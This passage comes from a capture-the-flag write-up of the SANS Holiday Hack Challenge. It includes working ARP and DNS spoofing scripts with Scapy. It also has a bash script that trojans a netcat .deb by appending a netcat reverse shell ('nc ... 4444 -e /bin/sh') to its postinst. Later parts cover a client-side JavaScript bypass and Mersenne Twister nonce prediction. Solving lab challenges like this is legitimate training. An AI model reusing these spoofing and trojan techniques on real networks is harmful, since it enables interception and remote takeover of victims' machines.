        arp_response.op =  'is-at'
        arp_response.plen = 4
        arp_response.hwlen = 6
        arp_response.ptype = 0x800
        arp_response.hwtype = 0x1
        arp_response.hwsrc = macaddr
        arp_response.psrc =  packet[ARP].pdst
        arp_response.hwdst = packet[ARP].hwsrc
        arp_response.pdst = packet[ARP].psrc
        response = ether_resp/arp_response
        sendp(response, iface="eth0")
def main():
    # We only want arp requests
    berkeley_packet_filter = "(arp[6:2] = 1)"
    # sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)
if __name__ == "__main__":
    main()</p>
<h2 id="dns_resp-with-changes-for-dns-poisoning">dns_resp (with changes) for DNS poisoning :</h2>
<h1 id="usrbinpython3_1">!/usr/bin/python3</h1>
<p>from scapy.all import *
import netifaces as ni
import uuid</p>
<h1 id="our-eth0-ip_1">Our eth0 IP</h1>
<p>ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']</p>
<h1 id="our-mac-addr">Our Mac Addr</h1>
<p>macaddr = ':'.join(['{:02x}'.format((uuid.getnode() &gt;&gt; i) &amp; 0xff) for i in range(0,8*6,8)][::-1])</p>
<h1 id="destination-ip-we-arp-spoofed">destination ip we arp spoofed</h1>
<p>ipaddr_we_arp_spoofed = "10.6.6.53"
def handle_dns_request(packet):
    # Need to change mac addresses, Ip Addresses, and ports below.
    # We also need
    eth = Ether(src=packet.dst, dst=packet.src) <br />
    ip  = IP(dst=packet[IP].src, src=packet[IP].dst)
    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
    dns = DNS(
        # MISSING DNS RESPONSE LAYER VALUES 
        id=packet[DNS].id,
        qr=1,
        ancount=1,
        aa=1,
        qd=packet[DNS].qd,
        an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=ipaddr)
    )
    dns_response = eth / ip / udp / dns
    sendp(dns_response, iface="eth0")
def main():
    berkeley_packet_filter = " and ".join( [
        "udp dst port 53",                              # dns
        "udp[10] &amp; 0x80 = 0",                           # dns request
        "dst host {}".format(ipaddr_we_arp_spoofed),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(macaddr)             # our macaddress since we spoofed the ip to our mac
    ] )
    # sniff the eth0 int without storing packets in memory and stopping after one dns request
    sniff(filter=berkeley_packet_filter, prn=handle_dns_request, store=0, iface="eth0", count=1)
if __name__ == "__main__":
    main()</p>
<h2 id="build_linux_trojansh-to-create-a-linux-trojan-with-a-deb-file">build_linux_trojan.sh [to create a Linux trojan with a .deb file]</h2>
<h1 id="binbash">!/bin/bash</h1>
<p>cd ~/
mkdir build-payload
cp debs/netcat-traditional_1.10-41.1ubuntu1_amd64.deb build-payload/
cd build-payload
mkdir work
echo "Extracting netcat-traditional_1.10-41.1ubuntu1_amd64.deb to work/ folder"
dpkg -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb work
mkdir work/DEBIAN
ar -x netcat-traditional_1.10-41.1ubuntu1_amd64.deb 
echo "Extracting the control and postinst file from netcat-traditional_1.10-41.1ubuntu1_amd64.deb and "
tar -xf control.tar.xz ./control
tar -xf control.tar.xz ./postinst
echo "stuffing nc 10.6.6.53 4444 -e /bin/sh to the postinst file"
echo "nc 10.6.0.3 4444 -e /bin/sh" &gt;&gt; postinst    # thats my IP address which I want 10.6.6.35 to connect to get the reverse shell on this host
mv control work/DEBIAN/
mv postinst work/DEBIAN/
cd ~/
echo "buiding the deb package"
dpkg-deb --build build-payload/work/
cd ~/
mkdir -p pub/jfrost/backdoor
echo "moving the work.deb to pub/jfrost/backdoor/suriv_amd64.deb"
mv build-payload/work.deb pub/jfrost/backdoor/suriv_amd64.deb
echo "pub/jfrost/backdoor/suriv_amd64.deb is ready!"</p>
<h1 id="objective-10-defeat-fingerprint-sensor">Objective 10: Defeat Fingerprint Sensor</h1>
<p>Bypass the Santavator fingerprint sensor. Enter Santa’s office without Santa’s fingerprint.</p>
<h2 id="high-level-details">High level details :</h2>
<ol>
<li>When you click the elevator panel, a special JavaScript file named “app.js” get loaded which checks for a flag named “besanta” for successful scan of the fingerprint.</li>
<li>We host that "app.js" file in our local with the "besanta" check removed and then load that file using Fiddler instead of server app.js.</li>
<li>With "besanta" check removed, you bypass the fingerprint check.</li>
</ol>
<h2 id="process_15">Process :</h2>
<p>Below actions are as me (not Santa).<br />
If you right click on the Scan Fingerprint and "Inspect"</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-42.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-42.png?w=896" /></a></p>
<p>User Chrome's inspect to look at the javascript behind the "Scan fingerprint" image</p>
<p>You will see the that fingerprint image is actually a DIV with class name "print-cover" with click action handler of which is in app.js.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-44.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-44.png?w=1024" /></a></p>
<p><strong>View source showing the click handler will execute a function in https://elevator.kringlecastle.com/app.js</strong></p>
<p>Now look at the event handler in the app.js.<br />
In addition to the powered, it checks if the token named "<strong>besanta</strong>".<br />
If It’s there, it will allow to go to Santa's office. If not, it will play error sound.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-45.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-45.png?w=674" /></a></p>
<p><strong>Click handler of "Scan fingerprint" image</strong></p>
<p>Now, what we can do is to make a copy of this app.js, remove that &amp;&amp; hasToken('besanta') condition.<br />
Then host that in local IIS server (like <a href="http://localhost/app.js">http://localhost/app.js</a>)  </p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-46.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-46.png?w=725" /></a></p>
<p><strong>Check for "besanta" removed in local app.js</strong></p>
<p>Open Fiddler and apply filter for app.js so when you click on the scan fingerprint image only that URL gets captured.<br />
<strong>https://elevator.kringlecastle.com/app.js</strong></p>
<ol>
<li>Traffic to https://elevator.kringlecatsle.com/app.js is captured.</li>
<li>Filter applied</li>
<li>Filter to "show if URL contains"</li>
<li>Filter value "app.js"</li>
</ol>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-47.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-47.png?w=931" /></a></p>
<p>Save the contents of <a href="https://elevator.kringlecastle.com/app.js">https://elevator.kringlecastle.com/app.js</a> to a file named app.js and py the file in local IIS server e.g. c:\inetpub\wwwroot so the file could be accessble on <a href="https://localhost/app.js">https://localhost/app.js</a></p>
<p>See the below screenshot (steps are numbered):<br />
Go to Fiddler &gt; AutoResponder (1) &gt; Enable Rules (2) &gt; Add Rule (3) &gt; Add <a href="https://localhost/app.js">https://localhost/app.js (4)</a> &gt; Save (5)</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-48.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-48.png?w=923" /></a></p>
<p>This will replace the has Token app.js file from sever <a href="https://elevator.kringlecastle.com/app.js">https://elevator.kringlecastle.com/app.js</a>  (with 'besanta' check)</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-49.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-49.png?w=910" /></a></p>
<p>Now when you click on the fingerprint scanner, you will be able to get into Santa's office.</p>
<h1 id="objective-11a-naughtynice-list-with-blockchain-investigation-part-1">Objective 11a): Naughty/Nice List with Blockchain Investigation Part 1</h1>
<p>Even though the chunk of the blockchain that you have ends with block 129996, can you predict the nonce for block 130000? Talk to Tangle Coalbox in the Speaker UNpreparedness Room for tips on prediction and Tinsel Upatree for more tips and tools. (Enter just the 16-character hex value of the nonce)</p>
<h2 id="answer-57066318f32f729d">Answer : 57066318F32F729D</h2>
<h2 id="high-level-approach_2">High-level approach :</h2>
<p>In Santa's office, Tinsel Upatree has the Blockchain.dat and the zip file containing the python script<br />
The naughty_nice.py verifies the block chain up to block# 129996. So, we have nonce up to 12996. 
If we get the last 624 nonces with last one being of block# 12996, we can use the MT19937Predictor to get the nonce of 12997, 12998, 12999 and finally 13000 which is needed by this objective.</p>
<h2 id="details">Details :</h2>
<p>The zip file named OfficialNaughtyNiceBlockchainEducationPack.zip has following contents.<br />
We put the Blockchain.dat to examine it using the naughty_nice.py</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-50.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-50.png?w=624" /></a></p>
<p>Contents of "OfficialNaughtyNiceBlockchainEducationPack.zip"</p>
<p>The naughty_nice.py was changed to get all the last 624 nonces of the blockchain.<br />
Then those last 624 nonces were fed into the MT19937Predictor() to get nonce for block# 12997<br />
The nonce of 12997 was included in the list to get the nonce for block# 12998. 
The nonce of 12998 was included in the list to get the nonce for block# 12999. 
The nonce of 12999 was included in the list to get the nonce for block# 13000.</p>
<p>For changes in the naughty_nice.py, compare the naughty_nice_original.py and naughty_nice.py.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-51.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-51.png?w=925" /></a></p>
<p><strong>Changes in "naughty_nice.py"</strong></p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-52.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-52.png?w=866" /></a></p>
<p><strong>Running naughty_nice.py. The nonce for block#13000 is 6270808489970332317</strong></p>
<p>Converting to hexadecimal It would be 57066318F32F729D and that’s the answer.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-53.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-53.png?w=453" /></a></p>
<p><strong>Convering decimal to hex</strong></p>
<h2 id="the-below-zip-file-contains-the-changed-naughty_nicepy-please-remove-the-txt-after-extraction">The below zip file contains the changed naughty_nice.py (please remove the .txt after extraction)</h2>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/naughty_nice.py_.zip">naughty_nice.py</a><a href="https://ashishrocks.files.wordpress.com/2021/01/naughty_nice.py_.zip">Download</a></p>
<h2 id="naughty_nicepy">naughty_nice.py</h2>
<pre><code class="language-python">#!/usr/bin/env python3
'''
So, you want to work with the naughty/nice blockchain?
Welcome!  
This python module is your first step in that process. It will introduce you to how the Naughty/Nice
blockchain is structured and how we at the North Pole use blockchain technology. The North Pole
has been using blockchain technology since Santa first invented it back in the 1960's. (Jolly
prankster that he is, Santa posted a white paper on the Internet that he wrote under a pseudonym
describing a non-Naughty/Nice application of blockchains a dozen or so years back. It caused quite
a stir...)
Important note: This module will NOT allow you to add content to the Official Naughty/Nice Blockchain!
That can only be done through the Official Naughty/Nice Website, which passes new blocks to the Official
Santa Signature System (OS3) that applies a digital signature to the content of each block before it is
added to the chain. Only blocks whose contents have been digitally signed by that system are placed on
the Naughty/Nice blockchain.
Note: If you're authorized to use the Official Naughty/Nice website, you will have been given a login and
password for that site after completing your training as a part of Elf University's &quot;Assessing and
Evaluating Human Behavior for Naughty/Niceness&quot; Curriculum.
This code is used to introduce how blocks/chains are created and allow you to view and/or validate 
portions (or the entirety) of the Official Naughty/Nice Blockchain.
A blockchain, while a part of the whole cryptocurrency &quot;fad&quot; that a certain pseudonym-packing North Pole
resident appears to have begun, are certainly not limited to that use. A blockchain can be used anywhere
that a record of information or transactions need to be maintained in a way that cannot be altered. And
really, what information is more important (and necessarily unalterable) than acts of Naughty/Niceness?
A blockchain works by linking each record together with the previous record. Each block's data contains
a cryptographic hash of the previous block's data. Because a block cannot be altered without altering
the cryptographic hash of its contents, any alteration of the data within a block will be immediately
evident, because every following block will no longer be valid.
In addition to this built-in property of a blockchain, the Official Naughty/Nice Blockchain has a few
other safeguards. The cryptographic hash of each block is signed using the Official Santa Signature
System (OS3). Currently, the Official Naughty/Nice Blockchain uses MD5 as its hashing algorithm, but
plans are in place to move to SHA256 in 2021. This update is part of a phased process to modernize
the blockchain code. In 2019, the entire blockchain system was ported from the original COBOL code to
Python3. Because of concerns about hash collisions in MD5, in the new Python3 code, a 64-bit random 
&quot;nonce&quot; was added to the beginning of each block at the time of creation.
This module represents a portion of the most current blockchain codebase. It consists of two classes,
one for the creation of blocks, called Block(), and one for the creation, examination, and verification of
chains of blocks, called Chain(). 
The following is an overview of the functionality provided by these classes:
The Chain() class is where most blockchain work is performed. It is designed to be as &quot;block-agnostic&quot;
as possible, so it can be used with blocks that hold different types of data. To use a different type
of block, you simply replace (or subclass) the Block() class. For this to work, there are several
functions that MUST be supplied by the Block() class. Let's take a look at those.
The Block() class MUST supply the following functions, used by the Chain() class:
    create\_genesis\_block() - This creates a very special block used at the beginning of the blockchain,
    and known as the &quot;genesis&quot; block. Because it has no previous block to reference it is, by definition,
    always considered valid. This block uses an agreed-upon, fake previous hash value.
    verify\_types() - Because the Chain() class is block-agnostic, it needs the Block() class to validate
    that a block contains valid data. This function returns True or False.
    block\_data() - a function that returns a representation of all of the data in the block that is to
    be hashed and signed. The data is returned as a Python3 bytes object.
    full\_block\_data() - a function that returns a representation of the entire block, including any
    hashes and signatures. A hash of this data is what is used as the &quot;previous hash&quot; value in the
    subsequent block. This data is returned as a Python3 bytes object. This function is also used
    when saving either the entire blockchain to a file, or a single block to a file
    load\_a\_block(\[filehandle\]) - this function takes a filehandle and returns a block at a time for
    addition to the block chain. This function DOES NOT verify blocks. This function throws a
    Value\_Error exception when it either encounters the end of the file or unparsable data.
The Naughty/Nice Block() class also defines a utility function:
    dump\_doc(\[document number\]) - this will dump the indicated supporting document to a file named
    as &lt;block\_index&gt;.&lt;data\_type\_extension&gt;. Note: this function will overwrite any existing file 
    with that name, so if there are multiple documents (there can be up to 9) of the same type 
    affixed to a record, it is the responsibility of the calling process to rename them as appropriate.
The Chain() class provides the following functions:
    add\_block(\[block\_data\]) - passes a block\_data dictionary to the Block() initialization code.
    This function, being &quot;block-agnostic&quot; simply passes the block\_data along. It is up to the Block()
    initialization code to validate this data.
    verify\_chain(\[public\_key\], &lt;beginning hash&gt;) - steps through every block in the chain and
    verifies that the data in each block is of the correct type, that the block index is correct,
    that the block contains the correct hash for the previous block, and that the block signature
    is a valid signature based on the hash of the block data. It then hashes the full block for use
    as the &quot;previous hash&quot; on the next block. This returns True or False. (If False, it prints
    information about what, specific, issues were found and the block that triggered the issue.)
    Note: If you're working with a portion of the block chain that does not begin with a genesis
    block, you'll need to provide a value for the previous block's hash for this function to
    work.
    save\_a\_block(index, &lt;filename&gt;) - saves the block at index to the filename provided, or to 
    &quot;block.dat&quot; if no filename is given.
    save\_chain(&lt;filename&gt;) - saves the chain to the filename provided, or to &quot;blockchain.dat&quot; if
    no filename is given.
    load\_chain(&lt;filename&gt;) - loads a chain from the filename provided, or from &quot;blockchain.dat&quot; if
    no filename is given. This returns the count of blocks loaded. This DOES NOT verify that the
    data loaded is a valid blockchain. It is recommended to call verify\_chain() immediately after
    loading a new chain.   
An overview of how we process the Official Naughty/Nice Blockchain:
There are approximately 7.8 billion people and magical beings on Earth, and each one is tracked
24 hours a day throughout the year by a fleet of Elves-On-The-Shelves. While those elves are
clearly visible during the Holiday season, don't be fooled into believing that we're only tracking
Naughty/Niceness at that time. On average, each of the billions of subjects that we monitor are
performing some sort of Naughty or Nice activity that rises to the level of being scored on the
blockchain around 2.1 times per week. Keeping track of all of that activity on a single blockchain
would be incredibly processing intensive (that would be ~1^12 blocks/year, or 32,000 blocks/second),
so we've broken our record-keeping into 1,000 different blockchains. If you do the math, you'll find
that each of the blockchains is now responsible for between 1,500 and 2000 blocks per minute, which
is a reasonable load. A separate database keeps track of which Personal ID (pid) is assigned to each
of the blockchains.
Throughout the year, we periodically run each of the chains to determine who is the best (and worst)
of our subjects. While only the final Holiday run is used to determine who is getting something
good in their stockings and who is getting a lump of coal, it's always interesting to see a listing
of the Nicest and Naughtiest folks out there. 
Please note: Wagering on the results of the Official Naughty/Nice Blockchain is STRICTLY PROHIBITED.
If you intend to use your access to the Official Naughty/Nice Blockchain code to facilitate any sort
of gambling, you will be racking up a whole bunch of Naughtiness points. YOU HAVE BEEN WARNED! (I'm
looking at you, Alabaster Snowball...)
For this reason, we have not provided any code that will perform a computation of Naughty/Nice
points. Additionally, for privacy reasons, there is also no code to pull the records associated
with specific individuals from this list. While the creation of that code would not be difficult,
you are honor-bound to use your access to this list for only good and noble purposes.
Signing Keys - Information
We have provided you with an example private key that you can use when generating your own blockchains
for test purposes. This private key (which also contains the public key information) is called 
private.pem.
Additionally, we have provided you with a copy of the public key used to verify the Official
Naughty/Nice Blockchain. This is the public key component of the private key used by the Official
Santa Signature System (OS3) to sign blocks on the Official Naughty/Nice Blockchain. This key
is contained in the file official\_public.pem.
'''
import random
from Crypto.Hash import MD5, SHA256
from Crypto.PublicKey import RSA
from Crypto.Signature import PKCS1\_v1\_5
from base64 import b64encode, b64decode
import binascii
import time
import itertools
from mt19937predictor import MT19937Predictor
genesis\_block\_fake\_hash = '00000000000000000000000000000000'
data\_types = {1:'plaintext', 2:'jpeg image', 3:'bmp image', 4:'gif image', 5:'PDF', 6:'Word', 7:'PowerPoint', 8:'Excel', 9:'tiff image', 10:'MP4 video', 11:'MOV video', 12:'WMV video', 13:'FLV video', 14:'AVI video', 255:'Binary blob'}
data\_extension = {1:'txt', 2:'jpg', 3:'bmp', 4:'gif', 5:'pdf', 6:'docx', 7:'pptx', 8:'xlsx', 9:'tiff', 10:'mp4', 11:'mov', 12:'wmv', 13:'flv', 14:'avi', 255:'bin'}
Naughty = 0
Nice = 1
class Block():
    def \_\_init\_\_(self, index=None, block\_data=None, previous\_hash=None, load=False, genesis=False):
        if(genesis == True):
            return None
        else:
            self.data = \[\]
            if(load == False):
                if all(p is not None for p in \[index, block\_data\['documents'\], block\_data\['pid'\], block\_data\['rid'\], block\_data\['score'\], block\_data\['sign'\], previous\_hash\]):
                    self.index = index
                    if self.index == 0:
                        self.nonce = 0 # genesis block
                    else:
                        self.nonce = random.randrange(0xFFFFFFFFFFFFFFFF)
                    self.data = block\_data\['documents'\]
                    self.previous\_hash = previous\_hash
                    self.doc\_count = len(self.data)
                    self.pid = block\_data\['pid'\]
                    self.rid = block\_data\['rid'\]
                    self.score = block\_data\['score'\]
                    self.sign = block\_data\['sign'\]
                    now = time.gmtime()
                    self.month = now.tm\_mon
                    self.day = now.tm\_mday
                    self.hour = now.tm\_hour
                    self.minute = now.tm\_min
                    self.second = now.tm\_sec
                    self.hash, self.sig = self.hash\_n\_sign()
                else:
                    return None
    def \_\_eq\_\_(self, other):
        if isinstance(other, self.\_\_class\_\_):
            return self.\_\_dict\_\_ == other.\_\_dict\_\_
        else:
            return False
    def \_\_repr\_\_(self):
        s = 'Chain Index: %i\\n' % (self.index)
        s += '              Nonce: %s\\n' % ('%016.016x' % (self.nonce))
        s += '                PID: %s\\n' % ('%016.016x' % (self.pid))
        s += '                RID: %s\\n' % ('%016.016x' % (self.rid))
        s += '     Document Count: %1.1i\\n' % (self.doc\_count)
        s += '              Score: %s\\n' % ('%08.08x (%i)' % (self.score, self.score))
        n\_n = 'Naughty'
        if self.sign &gt; 0:
            n\_n = 'Nice'
        s += '               Sign: %1.1i (%s)\\n' % (self.sign, n\_n)
        c = 1
        for d in self.data:
            s += '         Data item: %i\\n' % (c)
            s += '               Data Type: %s (%s)\\n' % ('%02.02x' % (d\['type'\]), data\_types\[d\['type'\]\])
            s += '             Data Length: %s\\n' % ('%08.08x' % (d\['length'\]))
            s += '                    Data: %s\\n' % (binascii.hexlify(d\['data'\]))
            c += 1
        s += '               Date: %s/%s\\n' % ('%02.02i' % (self.month), '%02.02i' % (self.day))
        s += '               Time: %s:%s:%s\\n' % ('%02.02i' % (self.hour), '%02.02i' % (self.minute), '%02.02i' % (self.second))
        s += '       PreviousHash: %s\\n' % (self.previous\_hash)
        s += '  Data Hash to Sign: %s\\n' % (self.hash)
        s += '          Signature: %s\\n' % (self.sig)
        return(s)
    def full\_hash(self):
        hash\_obj = MD5.new()
        hash\_obj.update(self.block\_data\_signed())
        return hash\_obj.hexdigest()
    def hash\_n\_sign(self):
        hash\_obj = MD5.new()
        hash\_obj.update(self.block\_data())
        signer = PKCS1\_v1\_5.new(private\_key)
        return (hash\_obj.hexdigest(), b64encode(signer.sign(hash\_obj)))
    def block\_data(self):
        s = (str('%016.016x' % (self.index)).encode('utf-8'))
        s += (str('%016.016x' % (self.nonce)).encode('utf-8'))
        s += (str('%016.016x' % (self.pid)).encode('utf-8'))
        s += (str('%016.016x' % (self.rid)).encode('utf-8'))
        s += (str('%1.1i' % (self.doc\_count)).encode('utf-8'))
        s += (str(('%08.08x' % (self.score))).encode('utf-8'))
        s += (str('%1.1i' % (self.sign)).encode('utf-8'))
        for d in self.data:
            s += (str('%02.02x' % d\['type'\]).encode('utf-8'))
            s += (str('%08.08x' % d\['length'\]).encode('utf-8'))
            s += d\['data'\]
        s += (str('%02.02i' % (self.month)).encode('utf-8'))
        s += (str('%02.02i' % (self.day)).encode('utf-8'))
        s += (str('%02.02i' % (self.hour)).encode('utf-8'))
        s += (str('%02.02i' % (self.minute)).encode('utf-8'))
        s += (str('%02.02i' % (self.second)).encode('utf-8'))
        s += (str(self.previous\_hash).encode('utf-8'))
        return(s)
    def block\_data\_signed(self):
        s = self.block\_data()
        s += bytes(self.hash.encode('utf-8'))
        s += self.sig
        return(s)
    def load\_a\_block(self, fh):
        self.index = int(fh.read(16), 16)
        self.nonce = int(fh.read(16), 16)
        self.pid = int(fh.read(16), 16)
        self.rid = int(fh.read(16), 16)
        self.doc\_count = int(fh.read(1), 10)
        self.score = int(fh.read(8), 16)
        self.sign = int(fh.read(1), 10)
        count = self.doc\_count
        while(count &gt; 0):
            l\_data = {}
            l\_data\['type'\] = int(fh.read(2),16)
            l\_data\['length'\] = int(fh.read(8), 16)
            l\_data\['data'\] = fh.read(l\_data\['length'\])
            self.data.append(l\_data)
            count -= 1
        self.month = int(fh.read(2))
        self.day = int(fh.read(2))
        self.hour = int(fh.read(2))
        self.minute = int(fh.read(2))
        self.second = int(fh.read(2))
        self.previous\_hash = str(fh.read(32))\[2:-1\]
        self.hash = str(fh.read(32))\[2:-1\]
        self.sig = fh.read(344)
        return self
    def create\_genesis\_block(self):
        block\_data = {}
        documents = \[\]
        doc = {}
        doc\['data'\] = bytes('Genesis Block'.encode('utf-8'))
        doc\['type'\] = 1
        doc\['length'\] = len(doc\['data'\])
        documents.append(doc)
        block\_data\['documents'\] = documents
        block\_data\['pid'\] = 0
        block\_data\['rid'\] = 0
        block\_data\['score'\] = 0
        block\_data\['sign'\] = Nice
        b = Block(0, block\_data, genesis\_block\_fake\_hash)
        return b
    def verify\_types(self):  # check data types of all info in a block
        rv = True
        instances = \[self.index, self.nonce, self.pid, self.rid, self.month, self.day, self.hour, self.minute, self.second, self.previous\_hash, self.score, self.sign\]
        types = \[int, int, int, int, int, int, int, int, int, str, int, int\]
        if not sum(map(lambda inst\_, type\_: isinstance(inst\_, type\_), instances, types)) == len(instances):
            rv = False
        for d in self.data:
            if not isinstance(d\['type'\], int):
                rv = False
            if not isinstance(d\['length'\], int):
                rv = False
            if not isinstance(d\['data'\], bytes):
                rv = False
        return rv
    def dump\_doc(self, doc\_no):
        filename = '%s.%s' % (str(self.index), data\_extension\[self.data\[doc\_no - 1\]\['type'\]\])
        with open(filename, 'wb') as fh:
            d = self.data\[doc\_no - 1\]\['data'\]
            fh.write(d)
        print('Document dumped as: %s' % (filename))
class Chain():
    nonce\_list = \[\] 
    index = 0
    initial\_index = 0
    last\_hash\_value = ''
    def \_\_init\_\_(self, load=False, filename=None):
        if not load:
            self.blocks = \[Block(genesis=True).create\_genesis\_block()\]
            self.last\_hash\_value = self.blocks\[0\].full\_hash()
        else:
            self.blocks = \[\]
            self.load\_chain(filename)
            self.index = self.blocks\[-1\].index
            self.initial\_index = self.blocks\[0\].index
    def \_\_eq\_\_(self, other):
        if isinstance(other, self.\_\_class\_\_):
            return self.\_\_dict\_\_ == other.\_\_dict\_\_
        else:
            return False
    def add\_block(self, block\_data):
        self.index += 1
        b = Block(self.index, block\_data, self.last\_hash\_value)
        self.blocks.append(b)
        self.last\_hash\_value = b.full\_hash() 
    def verify\_chain(self, publickey, previous\_hash=None):
        flag = True
        # unless we're explicitly told what the initial last hash should be, we assume that
        # the initial block will be the genesis block and will have a fixed previous\_hash
        if previous\_hash is None:
            previous\_hash = genesis\_block\_fake\_hash
        for i in range(0, len(self.blocks)):  # assume Genesis block integrity
            block\_no = self.blocks\[i\].index
            if not self.blocks\[i\].verify\_types():
                flag = False
                print(f'\\n\*\*\* WARNING \*\*\* Wrong data type(s) at block {block\_no}.')
            if self.blocks\[i\].index != i + self.initial\_index:
                flag = False
                print(f'\\n\*\*\* WARNING \*\*\* Wrong block index at what should be block {i + self.initial\_index}: {block\_no}.')
            if self.blocks\[i\].previous\_hash != previous\_hash:
                flag = False
                print(f'\\n\*\*\* WARNING \*\*\* Wrong previous hash at block {block\_no}.')
            hash\_obj = MD5.new()
            hash\_obj.update(self.blocks\[i\].block\_data())
            signer = PKCS1\_v1\_5.new(publickey)
            if signer.verify(hash\_obj, b64decode(self.blocks\[i\].sig)) is False:
                flag = False
                print(f'\\n\*\*\* WARNING \*\*\* Bad signature at block {block\_no}.')
            if flag == False:
                print(f'\\n\*\*\* WARNING \*\*\* Blockchain invalid from block {block\_no} onward.\\n')
                return False
            previous\_hash = self.blocks\[i\].full\_hash()
        return True
    def save\_a\_block(self, index, filename=None):
        if filename is None:
            filename = 'block.dat'
        with open(filename, 'wb') as fh:
            fh.write(self.blocks\[index\].block\_data\_signed())
    def save\_chain(self, filename=None):
        if filename is None:
            filname = 'blockchain.dat'
        with open(filename, 'wb') as fh:
            i = 0
            while(i &lt; len(self.blocks)):
                fh.write(self.blocks\[i\].block\_data\_signed())
                i += 1
    def load\_chain(self, filename=None):
        count = 0
        if filename is None:
            filename = 'blockchain.dat'
        with open(filename, 'rb') as fh:
            while(1):
                try:
                    self.blocks.append(Block(load=True).load\_a\_block(fh))
                    self.index = self.blocks\[-1\].index
                    count += 1
                except ValueError:
                    return count
if \_\_name\_\_ == '\_\_main\_\_':
    with open('private.pem', 'rb') as fh:
        private\_key = RSA.importKey(fh.read())
    public\_key = private\_key.publickey()
    c1 = Chain()
    for i in range(9):
        block\_data = {}
        documents = \[\]
        doc = {}
        doc\['data'\] = bytes(('This is block %i of the naughty/nice blockchain.' % (i)).encode('utf-8'))
        doc\['type'\] = 1
        doc\['length'\] = len(doc\['data'\])
        documents.append(doc)
        block\_data\['documents'\] = documents
        block\_data\['pid'\] = 123 # this is the pid, or &quot;person id,&quot; that the block is about
        block\_data\['rid'\] = 456 # this is the rid, or &quot;reporter id,&quot; of the reporting elf
        block\_data\['score'\] = 100 # this is the Naughty/Nice score of the report
        block\_data\['sign'\] = Nice # this indicates whether the report is about naughty or nice behavior
        c1.add\_block(block\_data)
    print(c1.blocks\[3\])
    print('C1: Block chain verify: %s' % (c1.verify\_chain(public\_key)))
#Note: This is how you would load and verify a blockchain contained in a file called blockchain.dat
#
    with open('official\_public.pem', 'rb') as fh:
        official\_public\_key = RSA.importKey(fh.read())
    c2 = Chain(load=True, filename='blockchain.dat')
    print('C2: Block chain verify: %s' % (c2.verify\_chain(official\_public\_key)))
    print(c2.blocks\[0\])
    c2.blocks\[0\].dump\_doc(1)
    predictor = MT19937Predictor()
    nonce\_list= \[\]
    # Adding all the nonces of all the blocks in a list
    for i in range(len(c2.blocks)):
         nonce\_list.append(c2.blocks\[i\].nonce)

    # reeversing the list
    nonce\_list.reverse()
    # get the first 625 nonces
    last\_625\_block\_nonce = list(itertools.islice(nonce\_list,625))
    # reverse the list so we get the last 625 nonces
    last\_625\_block\_nonce.reverse()
   # Setting the data for 625 nonces to the MT19937Predictor
    for nonce in last\_625\_block\_nonce:
        predictor.setrandbits(nonce, 64)
    # calcutated nonce and added for block 12997 \[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\]
    predictor.setrandbits(13205885317093879758,64)
    # calculated nonce and added for block 12998 \[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\]
    predictor.setrandbits(109892600914328301,64)
    # calculated nonce and added for block 12999 \[lietarally ran the code at this point to get the nonce for block 12997 using predictor.getrandbits()\]
    predictor.setrandbits(9533956617156166628,64)
    # Get the nonce for block 13000
    print(predictor.getrandbits(64))
</code></pre>
<h1 id="the-snowball-fight">The snowball fight :</h1>
<p>We need to solve this challenge to get more hints for objective 11b)<br />
Welcome to Snowball Fight! You and an opponent each have five snow forts, but you can't see the others' layout. Start lobbing snowballs back and forth. Be the first to hit everything on your opponent's side!<br />
Note: On easier levels, you may pick your own name. On the Hard and Impossible level, we will pick for you. That's just how things work around here!<br />
What's more, on Impossible, we won't even SHOW you your name! In fact, just to make sure things are super random, we'll throw away hundreds of random names before starting!</p>
<h2 id="high-level-approach_3">High level Approach :</h2>
<ol>
<li>Open the "Impossible" game.</li>
<li>In the impossible, get seeds, predict seed. See below ("How to get the random seeds and calculate the next seed").</li>
<li>Open the game in a new window https://snowball2.kringlecastle.com/.</li>
<li>In this window, open the "easy" game and use the seed predicted in step 2).</li>
<li>Win the easy game. Record the moves.</li>
<li>Go back to the "impossible" window and use the same moves.</li>
<li>Win the 'Impossible' game.</li>
</ol>
<h2 id="process-details">Process details :</h2>
<p>You will see a number of seeds in the below URL response<br />
https://snowball2.kringlecastle.com/game<br />
They are exactly 624 seeds indicating the next seed could be predicted using the Mersenne Twister algorithm.<br />
So, we can use the python script M19937 to predict the next seed.</p>
<p><a href="https://guptaashish.com/wp-content/uploads/2021/01/image-54.png"><img alt="" src="https://guptaashish.com/wp-content/uploads/2021/01/image-54.png?w=864" /></a></p>
